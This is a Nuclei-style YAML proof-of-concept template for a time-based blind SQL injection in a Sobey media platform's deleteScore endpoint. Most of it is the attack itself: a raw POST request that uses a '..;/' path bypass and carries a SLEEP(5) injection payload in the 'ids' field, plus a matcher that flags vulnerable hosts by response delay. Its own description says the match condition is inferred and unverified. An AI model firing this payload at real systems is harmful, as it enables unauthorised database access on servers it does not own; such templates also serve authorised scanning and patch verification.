id: poc-uf6koiusemfm8ie0
info:
  name: 索贝融媒体 deleteScore 存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2026
http:
- raw:
  - 'POST /sobey-mchEditor/js/..;/mch/jztEditorScore/deleteScore HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    channelId=1&ids=(1'') OR (SELECT 8771 FROM (SELECT(SLEEP(5)))WWB)-- QTWL)&isRead=1&siteCode=&token=&userCode=admin'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 500 && duration >= 5
    condition: and
